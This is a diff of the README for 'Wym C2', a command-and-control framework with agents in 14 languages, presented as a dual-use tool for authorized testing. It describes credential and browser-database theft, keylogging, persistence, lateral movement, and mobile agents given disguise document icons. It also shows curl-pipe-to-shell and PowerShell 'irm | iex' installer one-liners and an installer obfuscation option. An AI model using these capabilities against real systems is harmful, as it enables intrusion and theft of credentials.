@@ -4,510 +4,172 @@
 
 Wym C2 are What you missed is Command and Control Frameworks:
 
-- **Server** — FastAPI + Jinja2 dashboard + SQLite (no external DB server needed)
-- **Clients** — agents for Python, Node.js, Bash, PowerShell, Lua, PHP, Perl, Ruby
-  plus compiled Go, Rust, C, C++ and C#/Java (Windows, Linux, macOS)
+- **Server** — FastAPI + Jinja2 dashboard + SQLite (no external DB server)
+- **Clients** — agents for Python, Node.js, Bash, PowerShell, Lua, PHP, Perl,
+  Ruby plus compiled Go, Rust, C, C++, C# and Java (Windows, Linux, macOS)
 - **Protocol** — plain HTTP/JSON, fully documented in [`PROTOCOL.md`](PROTOCOL.md)
-- **Docs** — [`AGENTS.md`](AGENTS.md) (client/agent guide), [`DEVELOPMENT.md`](DEVELOPMENT.md)
-  (build & run), [`SKILL.md`](SKILL.md) (opencode skill for editing this codebase)
+- **Docs** — [`AGENTS.md`](AGENTS.md) (client/agent guide),
+  [`DEVELOPMENT.md`](DEVELOPMENT.md) (build & run), [`SKILL.md`](SKILL.md)
+  (editing this codebase)
 
 > [!WARNING]
-> This is a dual-use security tool. You may only use it against systems you
-> **own** or for which you have **explicit written authorization** (scope
-> document from the asset owner). Unauthorized use is illegal in most
-> jurisdictions. The operators of this project assume no liability.
->
-> It contains **no evasion and no stealth**: a plain HTTP dashboard,
-> plaintext-friendly wire format, and no attempt to hide from EDR/AV. It *does*
-> ship operator-initiated `persistence`, `lateral`, `keylog`, `steal` and
-> service-installer tasks (so Windows Defender/AMSI will flag the PowerShell
-> agent) — use them only within your authorized scope.
+> This is a **dual-use security tool**. Use it only against systems you own or
+> have explicit written authorization to test. It contains **no evasion and no
+> stealth**: a plain HTTP dashboard, a plaintext-friendly wire format, and no
+> attempt to hide from EDR/AV. Default Defender/AMSI will flag the PowerShell
+> agent. The operators assume no liability for unauthorized use.
 
 ## Key Learnings
 
-Beyond being a C2 framework, this codebase is a working study of the
-agent↔server relationship. If you can trace one checkin → task → result round
-trip, you already understand the skeleton of SOAR/SIEM/XDR/EDR agents,
-multiplayer client-server loops, remote sensor fleets and similar systems:
+Trace one `checkin → task → result` round trip and you understand the skeleton
+of SOAR/SIEM/XDR/EDR agents, multiplayer client-server loops and remote sensor
+fleets:
 
-- **A wire protocol is the source of truth** — one spec (`PROTOCOL.md`) with
-  fixed JSON shapes keeps 14 language implementations interoperable. This is
-  exactly how multi-vendor SOAR/SIEM/XDR/EDR collectors and connectors stay
-  swappable without touching the backend.
-- **Persistent identity + graceful recovery** — the agent persists its id in a
-  state file and re-registers on `404`, so a lost server-side record never
-  bricks the fleet. Same principle as sticky sessions and re-login/reconnect
-  in multiplayer games and device fleets.
-- **Polling beats pushing** — jittered heartbeats with per-task timeouts keep a
-  NAT-friendly, outbound-only channel: the server never needs to reach the
-  client. Telemetry backends and game keepalives use the identical trick.
+- **A wire protocol is the source of truth** — one spec with frozen JSON
+  shapes keeps 14 language implementations swappable without backend changes.
+- **Persistent identity + graceful recovery** — the agent persists its id and
+  re-registers on `404`; a lost server-side record never bricks the fleet.
+- **Polling beats pushing** — jittered heartbeats with per-task timeouts keep
+  a NAT-friendly, outbound-only channel.
 - **Every remote action is a durable job** — dispatch → execute → report →
-  acknowledge → retry-unacknowledged turns any action (a shell command, a
-  pushed update, a file pull) into an idempotent queue item: the backbone of CI
-  runners, fleet management and game match-making services.
-- **Self-healing background watchers** — the `clone` task polls a target's
-  liveness and relaunches it when stale; the same watchdog idea as auto-restart
-  for game servers and EDR agent recovery.
-- **Operational hygiene** — shared-token auth, config via flags *and* env vars,
-  deterministic state paths, per-OS fallbacks. These are the boring details
-  that make distributed systems runnable by operators rather than demos.
-- **One contract, 14 runtimes, 3 OS families** — implementing the same wire
-  protocol in Python, Node.js, Bash, PowerShell, PHP, Ruby, Perl, Lua, Go,
-  Rust, C, C++, C# and Java is a crash course in cross-platform engineering:
-  process/threading models, HTTP clients, shell quoting (`cmd`,
-  PowerShell, POSIX `sh`), path and line-ending quirks, and windowing/input
-  APIs on Windows vs Linux vs macOS. A spec survives porting only when it is
-  small and the defaults are boring.
-
-Swap the protocol and the payloads, keep the lifecycle: you have understood
-the core of any client-server control plane.
-
----
+  acknowledge → retry-unacknowledged turns any action into an idempotent
+  queue item (the backbone of CI runners and fleet management).
+- **Self-healing watchers** — the `clone` task relaunches a stale/dead target,
+  the same watchdog trick as auto-restart for game servers and EDR agents.
+- **One contract, 14 runtimes, 3 OS families** — shell quoting, HTTP clients,
+  input/windowing APIs and path quirks per platform. A spec survives a port
+  only when it is small and its defaults are boring.
 
 ## How it works
 
 <p align="center"><img src="assets/process.svg" alt="Agent-server lifecycle" width="860"></p>
 
-1. **Register** — the agent posts its identity (`hostname`, `username`, `os`,
-   `arch`, `pid`, `ip`, `type`, `version`) and keeps the returned `agent_id`.
-2. **Check in** — every `interval ± jitter` seconds it asks the server for
-   tasks; a `404` means the server forgot it, so it **re-registers**.
-3. **Execute & report** — each task is run and its `{task_id, output,
-   exit_code}` is posted back. Unacknowledged tasks are re-sent by the server
-   after `C2_RETRY_AFTER`, so task handlers must be idempotent.
-4. **Manage** — operators queue tasks from the dashboard (shell, download,
-   upload, keylog, clipboard, screenshot, steal, clone, lateral, sleep, exit)
-   and watch agents go `alive → stale → dead`.
-
----
-
-## Screenshots
-
-<p align="center">
-  <img src="assets/screenshots/dashboard.png" alt="Dashboard" width="720">
-  <br><em>Dashboard — live metrics (alive / stale / dead) and per-agent tiles</em>
-</p>
-
-<p align="center">
-  <img src="assets/screenshots/agents.png" alt="Agent detail" width="720">
-  <br><em>Agent page — one-liner, notes, task history with output</em>
-</p>
-
-<p align="center">
-  <img src="assets/screenshots/generate.png" alt="Generate Agent" width="720">
-  <br><em>Generate Agent — ready-to-run installer for any of the 14 languages</em>
-</p>
-
-<p align="center">
-  <img src="assets/screenshots/login.png" alt="Login page" width="560">
-  <br><em>Dashboard login (PBKDF2 + server-side sessions)</em>
-</p>
-
----
+1. **Register** — the agent posts identity (`hostname`, `username`, `os`,
+   `arch`, `pid`, `ip`) and keeps the returned `agent_id`.
+2. **Check in** — every `interval ± jitter` s it asks for tasks; `404` → it
+   re-registers.
+3. **Execute & report** — each task returns `{task_id, output, exit_code}`;
+   unacknowledged tasks are re-sent after `WYM_RETRY_AFTER`, so handlers must
+   be idempotent.
+4. **Manage** — operators queue tasks from the dashboard and watch agents go
+   `alive → stale → dead`.
 
 ## Features
 
-- Agent registration, heartbeat/checkin, tasking, result reporting
-- Task types: `shell` (per-task timeout, default 120s), `download` (push staged
-  file to agent, optional destination path), `upload` (pull file from agent),
-  `keylog` (start/stop/dump keystroke logger), `sleep` (change interval), `exit`
-- `steal` task: collect environment variables, credential/token files
-  (`~/.ssh`, aws/gcloud credentials, *rc files, …) and raw browser databases
-  (Chromium `Login Data`/`Cookies`/`Web Data`, Firefox `cookies.sqlite`/
-  `logins.json`/`key4.db`/`cert9.db`), then zip + upload as a single
-  `steal.zip` into **Collected Files**. Profiles: `all | env | tokens | browser`.
-  Raw copy only — no decryption on the agent side, so browser secrets stay
-  encrypted at rest and must be cracked offline.
-- `clone` task: an agent becomes a **watcher** that polls
-  `GET /api/clone/status/{target}` for a target agent and runs the configured
-  **relaunch command** the moment the target is `dead`/`stale` — cross-agent
-  resurrection (self-heal or heal a companion). Actions:
-  `start | stop | status`; optional check interval; command examples:
-  `schtasks /Run /TN "C2Agent"`, `Start-Service C2Agent`, or a direct
-  `python agent.py --server ... --token ...` relaunch. The relaunch command is
-  run through the watcher's shell, *detached*, only while the watcher lives.
-- Per-agent **note** (annotate hosts), task **re-queue** for `sent`/`failed`
-  tasks, automatic retry of unacknowledged tasks after `C2_RETRY_AFTER` seconds
-- **Generate Agent** page: build a ready-to-run **one-liner** for any of the 14
-  languages (server URL, token, interval, jitter, payload shell pre-filled).
-  All configuration is embedded **server-side into an installer script**, so the
-  public one-liner stays short and carries no query parameters:
-  - `curl -LsSf 'http://host/agent/python/installer.sh' | sh` (Linux/macOS)
-  - `powershell -ExecutionPolicy Bypass -c "irm 'http://host/agent/python/installer.ps1' | iex"` (Windows)
-  - Compiled languages can cross-compile on the server (`build on server`),
-    generating a pre-built binary the installer fetches directly. Java produces
-    a platform-independent **JAR** that the installer runs via `java -jar`; the
-    other compiled languages (Go, Rust, C, C++, **C#/.NET**) produce a native
-    binary per target platform (`win_x64/x86`, `linux_x64/arm64`,
-    `darwin_x64/arm64`). .NET cross-publishes with the matching RID
-    (`win-x64`, `linux-x64`, `osx-arm64`, …) using the SDK installed by
-    `dotnet-install.sh`.
-- **Obfuscate toggle** on the Generate page: encrypts the installer body with
-  AES-256-CBC. The key is **kept on the server** and fetched at runtime by the
-  target via `/api/obfkey?token=...` (never embedded in the script), so the
-  served script is a short decrypt-and-run stub instead of readable config.
-- Jitter support on all clients (randomize the heartbeat interval)
-- Authenticated dashboard (PBKDF2 password + server-side sessions)
-- Shared-secret token authentication for agents (`X-Agent-Token`, also
-  accepted via the `C2_TOKEN` env var)
-- Auto-refreshing agent/task views, relative timestamps, status pills, agent
-  filters and live metrics (total / alive / stale / dead)
-- SQLite storage — zero config, one file
+- Register / checkin / tasking / result reporting per `PROTOCOL.md`.
+- Task types: `shell`, `download`, `upload`, `keylog`, `sleep`, `exit`,
+  `clipboard`, `screenshot`, `steal` (env/creds/browser DBs → `steal.zip`),
+  `clone` (self-heal watcher), `persistence`, `lateral`.
+- Per-agent **notes**, task **re-queue**, auto-retry, live metrics, filters.
+- **Generate Agent** page — ready-to-run one-liner + installer for every
+  language, with an **obfuscate** toggle (AES-256-CBC, key fetched at runtime
+  via `/api/obfkey?token=...`).
+- **Build on server** — cross-compile Go/Rust/C/C++ (.exe/.out) and Java
+  (cross-platform **JAR**); C# is **Windows-only** (`win_x64`/`win_x86`).
+- **Mobile agents** — Android **APK** (Gradle + SDK) and iOS **IPA**
+  (macOS + Xcode), built fully server-side with a custom artifact name and a
+  disguise launcher icon (PDF/DOCX/XLSX/PPTX/ZIP/RAR) rendered by
+  `server/icons.py`. Missing toolchains fail fast — never a fake artifact.
+- Jitter support everywhere; authenticated dashboard (PBKDF2 + sessions);
+  shared-secret `X-Agent-Token` agent auth; SQLite storage, zero config.
 
 ## Layout
 
 ```
-C2/
+Wym C2/
 ├── server/               FastAPI app
-│   ├── main.py           routes: agent API + dashboard
-│   ├── database.py       SQLite schema/helpers
-│   ├── auth.py           password hashing + sessions
-│   ├── templates/        Jinja2 pages
-│   ├── static/           CSS/JS
-│   ├── shared/           files staged to push to agents (download task)
-│   ├── collected/        files pulled from agents (upload task)
-│   └── c2.db             SQLite database (Windows; `c2_wsl.db` on Unix — created at first start)
-├── clients/              agents
-│   ├── agent.py          Python  (reference implementation)
-│   ├── agent.go          Go
-│   ├── agent.cs          C# / .NET
-│   ├── agent.rs          Rust
-│   ├── agent.java        Java (JDK 11+, stdlib only)
-│   ├── agent.js          Node.js
-│   ├── agent.php         PHP
-│   ├── agent.rb          Ruby
-│   ├── agent.pl          Perl
-│   ├── agent.lua         Lua
-│   ├── agent.ps1         PowerShell
-│   ├── agent.sh          Bash
-│   ├── agent.c / agent.cpp   C / C++
-│   ├── agent-service.ps1    single-file install/manage/watch any agent (Windows service/​task)
-│   ├── agent-service.sh     install/manage any agent as a systemd/​launchd/​cron job
-│   └── keylog_*.go       optional Go keylogger (linux/darwin/windows)
-├── PROTOCOL.md           wire protocol spec (for porting to any language)
+│   ├── main.py           routes: agent API + dashboard + build pipeline
+│   ├── database.py       SQLite schema/helpers (per-OS DB in server/)
+│   ├── auth.py           password hashing, sessions, CSRF
+│   ├── icons.py          mobile disguise-icon rendering (no image deps)
+│   ├── templates/ static/ shared/ collected/ builds/
+│   └── tests/            pytest suite (test_api.py, test_mobile.py)
+├── clients/              agents (.py .go .cs .rs .java .js .php .rb .pl
+│   │                     .lua .ps1 .sh .c .cpp) + agent-service.* + mobile/
+│   └── mobile/           android/ (Gradle, com.wym.c2) + ios/ (swiftc)
+├── install.ps1 / install.sh / uninstall.ps1 / uninstall.sh
+├── dotnet-install.sh     SDK bootstrap (no root, ~/.dotnet)
+├── AGENTS.md PROTOCOL.md DEVELOPMENT.md SKILL.md
 └── requirements.txt
 ```
 
----
-
 ## Server setup
 
-The preferred path is the cross-platform installer at the repo root. It creates
-the virtualenv, installs dependencies, detects the builder toolchain, starts the
-server and prints the dashboard credentials.
-
-**Windows** — `install.ps1` (ports default to **8000**, DB file `server/c2.db`):
+**Windows** — `.\\install.ps1` (default port **8000**, DB `server/wym.db`):
 
 ```powershell
-.\install.ps1                 # interactive: validates host/port/user, default random password
-.\install.ps1 -Password "a-strong-password"   # set the dashboard password explicitly
+.\install.ps1                       # interactive; random password printed
+.\install.ps1 -Password "a-strong-password"
 ```
 
-**Linux / macOS / BSD / WSL** — `install.sh` (ports default to **8001**, DB file
-`server/c2_wsl.db`):
+**Linux / macOS / BSD / WSL** — `./install.sh` (default port **8001**, DB
+`server/wym_wsl.db`):
 
 ```bash
-./install.sh --help                    # usage
-./install.sh -p "a-strong-password"    # set the dashboard password explicitly
+./install.sh --help
+./install.sh -p "a-strong-password"
 ```
 
-Both installers accept `-Host`/`-Port`/`-User` (and `-Password`, else a random
-one is generated and printed). Before writing anything they validate the
-configuration, detect the **builder toolchain** (Java/Go/Rust/C/C++/.NET) for
-server-side cross-compilation and print ready-to-copy install commands if a
-toolchain is missing.
+Installers validate config, detect builder toolchains, create platform venvs
+(`.venv` Windows / `.venv-wsl` Unix) and print missing-toolchain install
+commands. Uninstall via `uninstall.ps1` / `uninstall.sh` (removes only the
+matching OS artifacts).
 
-Virtualenvs are kept **separately per OS** to avoid WSL/Windows collisions on a
-shared folder: `.venv` (Windows) and `.venv-wsl` (Linux/macOS/WSL).
+Manual:
 
-To uninstall, use `uninstall.ps1` / `uninstall.sh` — each stops the server and
-removes only its own platform's artifacts (`c2.db`/`c2_wsl.db`, `.agent_token`/
-`.agent_token_wsl`, `.server.pid`/`.server.pid_wsl`, `.server.port`/
-`.server.port_wsl`, `server.log`/`server_wsl.log`, venv, plus the
-platform-neutral `builds/`; add
-`-Force`/`--force` to skip the confirmation prompt).
-
-Manual setup (equivalent to what the installer does):
-
-```powershell
-cd C2\server
-python -m venv .venv                     # Windows
-# python3 -m venv .venv-wsl              # Linux/macOS/WSL
-.\.venv\Scripts\Activate.ps1             # Windows
-# source .venv-wsl/bin/activate          # Linux/macOS/WSL
-pip install -r ..\requirements.txt
-python main.py                           # http://0.0.0.0:8000 (Windows) / 8001 (Unix)
-```
-
-or directly with uvicorn:
-
-```powershell
-uvicorn main:app --host 0.0.0.0 --port 8000
-```
-
-On first start the server:
-
-1. generates a random **agent token** and writes it to
-   `server/.agent_token` (Windows) / `server/.agent_token_wsl` (Unix) — keep
-   that file secret,
-2. creates a dashboard user and **prints the initial password to the console**
-   (it is random unless you set `C2_PASSWORD`).
-
-The database file is chosen per platform: `server/c2.db` on Windows,
-`server/c2_wsl.db` elsewhere — the agent token, PID/port files, venv and log
-follow the same per-OS naming (bare on Windows, `_wsl` on Unix) so a project
-folder shared between Windows and WSL never collides. On every startup the
-server re-syncs the default dashboard user so its password always matches the
-current `C2_PASSWORD` env var.
-
-Recommended to set explicitly:
-
-```powershell
-$env:C2_USER = "admin"
-$env:C2_PASSWORD = "a-strong-password"
-$env:C2_PORT = "8000"
+```bash
+cd server && python -m venv .venv            # Unix: .venv-wsl
+.venv\Scripts\activate                        # Windows: pip install -r ..\requirements.txt
+pip install -r requirements.txt
+$env:WYM_PASSWORD = "a-strong-password"      # Windows; pin it to avoid a random boot password
 python main.py
 ```
 
-Open `http://127.0.0.1:8000/login` and sign in (port 8001 when started via
-`install.sh` on Unix).
-
----
-
-## Dependencies
-
-### Server
-
-- **Python 3.9+** plus the packages in [`requirements.txt`](requirements.txt)
-  (`fastapi`, `uvicorn[standard]`, `jinja2`, `python-multipart`, `pydantic`,
-  `psutil`, `pywinpty` on Windows, `pycryptodome`). The installers create the
-  virtualenv for you; nothing else is needed to serve the dashboard + agent API.
-- **Build toolchains** — only for compiling on the server (Generate Agent →
-  "build on server") or local builds: `go`, `cargo`, `gcc`/`g++` + libcurl
-  headers, the .NET SDK, and a JDK (11+). Installers probe for what is present
-  and print ready-to-run install commands for what is missing (they never
-  auto-download toolchains).
-
-### Installing the build toolchains
-
-The installers (`install.ps1` / `install.sh`) probe each binary and, when one is
-missing, print the exact command for your platform. Summary table:
-
-| Toolchain | Windows (`winget` / `scoop`)                     | Debian/Ubuntu (`apt-get`) | macOS (`brew`) | Server probes |
-|-----------|--------------------------------------------------|---------------------------|----------------|---------------|
-| Go        | `winget install GoLang.Go` / `scoop install go` | `apt-get install golang`  | `brew install go` | `go` |
-| Rust      | `winget install Rustlang.Rustup` / `scoop install rustup` | `apt-get install rustc cargo` | `brew install rust` | `cargo` |
-| C / C++   | `winget install BrechtSanders.WinLibs.POSIX.UCRT` / `scoop install mingw` | `apt-get install gcc g++` | `brew install gcc` | `gcc`/`g++` or `clang` |
-| .NET SDK  | `winget install Microsoft.DotNet.SDK.8` / `scoop install dotnet-sdk` | `apt-get install dotnet-sdk-8.0` | `brew install dotnet` | `dotnet` |
-| Java JDK  | `winget install Oracle.JDK` / `scoop install openjdk` | `apt-get install openjdk-17-jdk` | `brew install openjdk` | `javac` |
-
-On Linux/macOS/WSL, the **.NET SDK** can also be installed with the bundled
-Microsoft script (no admin required, installs to `~/.dotnet`):
-
-```bash
-./dotnet-install.sh                 # latest LTS SDK, default location
-# or pin a channel / version:
-./dotnet-install.sh --channel 8.0   # 8.0.x SDK
-./dotnet-install.sh --version 8.0.404
-```
-
-It is upstream's `dotnet-install.sh` plus one addition: it appends
-`export PATH="$HOME/.dotnet:$PATH"` to your shell profile (`~/.bashrc`,
-`~/.zshrc`, `~/.kshrc` or `~/.profile`) so `dotnet` resolves in later shells.
-`install.sh` does the same when it finds an SDK under `~/.dotnet` that is not
-yet on `PATH`; the server also probes `~/.dotnet` directly, so a build works
-even before you open a new shell.
-
-Rust cross-compile targets (e.g. `x86_64-unknown-linux-musl` or a Windows GNU
-target) must be installed before "build on server" can target them:
-`rustup target add <target>`. Go, C/C++, and .NET handle their target
-platforms through their own mechanisms (`GOOS`/`GOARCH`, cross-MinGW/clang
-toolchains, dotnet RIDs via `dotnet publish`).
-
-### Agents
-
-| Agent        | Runtime / toolchain                     | Notes                                 |
-| ------------ | --------------------------------------- | ------------------------------------- |
-| `agent.py`   | Python 3.9+ + `requests`                | `pynput` optional → enables `keylog`  |
-| `agent.js`   | Node.js (stdlib only)                   | —                                     |
-| `agent.sh`   | Bash + `curl` + `jq`                    | falls back to `python3` for JSON      |
-| `agent.ps1`  | Windows PowerShell 5.1+ / `pwsh`        | AMSI may flag it; Linux/macOS via `pwsh` |
-| `agent.php`  | PHP CLI                                 | cURL ext preferred, falls back to streams |
-| `agent.rb`   | Ruby (stdlib only)                      | —                                     |
-| `agent.pl`   | Perl (core `HTTP::Tiny` + `JSON::PP`)   | —                                     |
-| `agent.lua`  | Lua 5.x + `luasocket`                   | `luarocks install luasocket`          |
-| `agent.go`   | Go toolchain (compile)                  | env vars (`C2_*`) + `-h`/`--help` supported |
-| `agent.rs`   | Cargo / Rust toolchain (compile)        | env vars + `-h`/`--help` supported    |
-| `agent.c` / `agent.cpp` | `gcc`/`g++` + libcurl (compile) | env vars + `-h`/`--help` supported   |
-| `agent.cs`   | .NET SDK 8+ (compile)                   | cross-compiles to win/linux/macOS RIDs; env vars + `-h`/`--help` |
-| `agent.java` | JDK 11+ (compile; stdlib only)          | builds a cross-platform JAR; env vars + `-h`/`--help` |
-
-All 14 agents accept the same flags (`-h`/`--help`, `--server`, `--token`,
-`--interval`, `--jitter`, `--state`, `--verbose`) and the same environment
-variables (`C2_SERVER`, `C2_TOKEN`, `C2_INTERVAL`, `C2_JITTER`,
-`C2_STATE_FILE`, `C2_VERBOSE`). Explicit flags always win over env vars.
-
-Optional runtime helpers used by specific tasks:
-
-- **Clipboard / screenshot / keylog on Linux** — `xclip` → `wl-paste` → `xsel`;
-  `import` / `scrot` / `gnome-screenshot`; `xinput` / `/dev/input` (or `pynput`).
-- **`lateral`** — Windows: built-in `net use` + `schtasks`; Unix: `arp`/`ip
-  neigh` + `sshpass` + `scp`.
-- **Service install** — `agent-service.ps1` / `agent-service.sh` re-invoke the
-  same agent, so no extra runtime is needed.
-
----
+Open `http://127.0.0.1:8000/login` (port 8001 via `install.sh`). Server env
+knobs are listed in [`DEVELOPMENT.md`](DEVELOPMENT.md).
 
 ## Running an agent
 
 ```powershell
-$token = (Get-Content server\.agent_token).Trim()   # Unix: cat server/.agent_token_wsl
+$token = (Get-Content server\.agent_token).Trim()   # Unix: server/.agent_token_wsl
 python clients\agent.py --server http://127.0.0.1:8000 --token $token --interval 10 --jitter 2 --verbose
-# token also accepted via env var: $env:C2_TOKEN = $token
 ```
 
-Then in the dashboard:
+Or via the **Generate Agent** page one-liner / installer for any language.
+All 14 agents share the same flags (`--server --token --interval --jitter
+--state --verbose`) and the `WYM_*` env fallbacks (`WYM_SERVER WYM_TOKEN
+WYM_INTERVAL WYM_JITTER WYM_STATE_FILE WYM_VERBOSE`), plus `-h`/`--help`.
 
-1. Open the agent (click its hostname).
-2. Task type `shell`, payload `whoami` -> Queue task (optionally override the
-   timeout).
-3. Watch the result appear (page auto-refreshes every 5s).
+### As a service
 
-### Other languages
+- **Windows:** `clients/agent-service.ps1` — single-file, actions
+  `install/start/stop/restart/status/uninstall/relaunch/watch`, auto-detects
+  the runtime, `--token=TOKEN` for minus-fussy parsers.
+- **Linux/macOS:** `clients/agent-service.sh` — systemd (or cron/launchd)
+  unit, `Restart=always` / `KeepAlive`-style behavior.
 
-The 14 clients are: Python, Node.js, Bash, PowerShell, PHP, Ruby, Perl, Lua
-(interpreted) and Go, Rust, C, C++, C#, Java (compiled).
+## Dependencies
 
-```bash
-# Go
-cd clients && go build -o agent agent.go
-./agent --server http://127.0.0.1:8000 --token <TOKEN> --jitter 2 --verbose
+- **Server:** Python 3.10+ + `requirements.txt` (`fastapi`, `uvicorn`,
+  `jinja2`, `python-multipart`, `pycryptodome`, `psutil`, ...).
+- **Build toolchains** (only when compiling on the server): `go`, `cargo`,
+  `gcc`/`g++` + libcurl, .NET SDK, a JDK, Gradle + Android SDK, Xcode (iOS).
+  Rust on Linux additionally needs autotools + X11/input dev headers (see
+  [`DEVELOPMENT.md`](DEVELOPMENT.md)).
+- **Agent runtimes** exist on the target, not the server: `curl`+`jq`
+  (bash), `luasocket` (lua), Python `pynput` (optional keylog), `xclip`,
+  `scrot`, `sshpass` (Linux task helpers).
 
-# C# (.NET 6+)
-dotnet new console -o a && copy clients\agent.cs a\Program.cs
-dotnet build a -o out && .\out\a.exe --server http://127.0.0.1:8000 --token <TOKEN> --jitter 2
+## Security notes
 
-# Rust (needs cargo; manifests in clients/Cargo.toml)
-cd clients && cargo build --release
-./target/release/c2agent --server http://127.0.0.1:8000 --token <TOKEN> --jitter 2
-
-# Java (JDK 11+; stdlib only — no dependencies)
-javac -encoding UTF-8 clients/agent.java -d out
-java -cp out Agent --server http://127.0.0.1:8000 --token <TOKEN> --jitter 2
-# or pre-build a JAR server-side (Generate Agent -> build on server) and run:
-# java -jar agent.jar --server http://127.0.0.1:8000 --token <TOKEN> --jitter 2
-
-# PowerShell
-powershell -ExecutionPolicy Bypass -File clients\agent.ps1 -Server http://127.0.0.1:8000 -Token <TOKEN> -Jitter 2
-
-# Bash (needs curl + jq)
-./clients/agent.sh --server http://127.0.0.1:8000 --token <TOKEN> --jitter 2
-
-# Node / PHP / Ruby / Perl / Lua
-node clients/agent.js     --server http://127.0.0.1:8000 --token <TOKEN> --jitter 2
-php  clients/agent.php    --server http://127.0.0.1:8000 --token <TOKEN> --jitter 2
-ruby clients/agent.rb     --server http://127.0.0.1:8000 --token <TOKEN> --jitter 2
-perl clients/agent.pl     --server http://127.0.0.1:8000 --token <TOKEN> --jitter 2
-lua  clients/agent.lua    --server http://127.0.0.1:8000 --token <TOKEN> --jitter 2
-```
-
-All agents — script and compiled alike — accept the same six environment
-variables in addition to their flags: `C2_SERVER`, `C2_TOKEN`, `C2_INTERVAL`,
-`C2_JITTER`, `C2_STATE_FILE`, `C2_VERBOSE`. Explicit flags always win over
-env vars. Every agent also answers `-h` / `--help` with its usage + flags
-(compiled Go/Rust/C/C++/Java/C# implement it explicitly; Python/Node/PowerShell
-use their runtime's built-in parser). The dashboard **Generate Agent** page
-builds a ready-to-run one-liner and the corresponding installer for you; you
-normally don't need to run the clients by hand.
-
-See the header comment of each file for exact build steps.
-
-### Running the agent as a service
-
-`clients/agent-service.ps1` (Windows) and `clients/agent-service.sh` (Linux/macOS)
-install and manage *any* agent in `clients/` (Python, Node, Lua, PHP, Perl, Ruby,
-Bash, Java, or prebuilt C/C++/Go/Rust binaries) so it survives a reboot/logon and
-restarts on crash — ideal for pairing with the `clone` watcher.
-
-The correct runtime is auto-detected from the agent file, and the C2 flags stay
-uniform: `--server URL --token TOKEN [--interval N] [--jitter N] [--verbose]`.
-The scripts emit `--token=TOKEN` for parsers that need it (python/go/php/perl/ruby)
-and `--token TOKEN` for raw parsers (c/cpp/csharp/java/js/lua/rs/sh) — because the
-token usually starts with `-`, this matters.
-
-Windows (`.ps1`):
-
-```powershell
-# install a Python agent (prompts for server/token if not given)
-powershell -ExecutionPolicy Bypass -File clients\agent-service.ps1 install -Server http://127.0.0.1:8000 -Token <TOKEN>
-
-# other agents / compiled sources
-powershell -ExecutionPolicy Bypass -File clients\agent-service.ps1 install -Agent clients\agent.js -Lang node -Server http://127.0.0.1:8000 -Token <TOKEN>
-powershell -ExecutionPolicy Bypass -File clients\agent-service.ps1 install -Agent clients\agent.c -Build -Server http://127.0.0.1:8000 -Token <TOKEN>
-
-# backend: auto (nssm → sc → schtasks) or explicit
-powershell -ExecutionPolicy Bypass -File clients\agent-service.ps1 install -Backend nssm -Server http://127.0.0.1:8000 -Token <TOKEN>
-
-# manage
-powershell -ExecutionPolicy Bypass -File clients\agent-service.ps1 start | stop | restart | status | relaunch
-
-# remove
-powershell -ExecutionPolicy Bypass -File clients\agent-service.ps1 uninstall
-```
-
-- Services/tasks are named `Wym C2 Agent <lang>` with description
-  `Wym C2 are What you missed is Command and Control Frameworks`.
-- `nssm` and `sc` create a real auto-start service (reboot-safe, NSSM also
-  restarts after 5 s crashes) but need an **elevated** shell. `schtasks` works
-  without elevation; non-elevated shells use a one-shot fallback trigger and a
-  watchdog keeps the agent alive (use an elevated shell to get logon/boot
-  auto-start). Passing the token is required unless `server\.agent_token` (or
-  `.agent_token_wsl`) exists next to the checkout.
-- `-Agent`/`-Lang`/`-Build`/`-Backend` are also accepted as `-AgentScript`.
-
-Linux/macOS (`.sh`):
-
-```bash
-# install the Python agent as a systemd/launchd service (root on Linux)
-sudo bash clients/agent-service.sh install -s http://127.0.0.1:8001 -t <TOKEN>
-
-# other agents / compiled sources / forced backend
-sudo bash clients/agent-service.sh install -a clients/agent.js -s http://127.0.0.1:8001 -t <TOKEN>
-sudo bash clients/agent-service.sh install -a clients/agent.c --build -s http://127.0.0.1:8001 -t <TOKEN>
-sudo bash clients/agent-service.sh install --cron -a clients/agent.js -s http://127.0.0.1:8001 -t <TOKEN>   # cron fallback
-sudo bash clients/agent-service.sh install --at-boot -a clients/agent.java -s http://127.0.0.1:8001 -t <TOKEN>
-
-# start | stop | restart | status | relaunch
-sudo bash clients/agent-service.sh start
-```
-
-- Linux `systemd`: service `c2agent`, `Restart=always`, logs in `/var/log/`.
-  macOS `launchd`: agent `com.c2agent.agent`, `KeepAlive` on crash.
-  Re-running `install` rewrites the unit/config so a changed server/token is
-  applied in place.
-- `--cron` (or `-b cron`) is the no-elevation fallback: a crontab line plus a
-  pidfile for clean stop/status. `--at-boot` switches the schedule to `@reboot`.
-
----
-
-## Security notes (for the operator)
-
-- Change the dashboard password immediately (`C2_PASSWORD` env var) and use HTTPS
-  (terminate with a reverse proxy such as Caddy/nginx, or a self-signed cert via
-  `uvicorn --ssl-keyfile --ssl-certfile`) — the protocol is HTTP and not encrypted
-  by itself.
-- The dashboard **does** enforce CSRF on state-changing requests (session-bound
-  HMAC tokens on all POST forms). It is still designed for a trusted operator
-  network, not for public exposure.
-- `server/.agent_token` (Windows) / `server/.agent_token_wsl` (Unix) is a
-  shared secret: rotate it by deleting the file and restarting (all agents
-  must be re-registered). Installer endpoints only serve
-  installers after a `Build Agent` run — they never fall back to baking the
-  master token into a request, so they are not a token leak vector.
-- Command execution is the entire point of the tool; restrict who can reach the
-  dashboard (bind to a management interface, firewall rules, VPN).
+- Use HTTPS (reverse proxy, or `uvicorn --ssl-keyfile/--ssl-certfile`); the
+  wire protocol is plaintext.
+- Rotate the agent token by deleting `server/.agent_token{_wsl}` and
+  restarting (agents must re-register).
+- The dashboard enforces CSRF on all POST forms but is meant for a trusted
+  network — bind to a management interface/firewall/VPN.
 
 ## License / stance
 
-Provided for security education, research, and authorized engagements. Use
+Provided for security education, research and authorized engagements. Use
 responsibly.
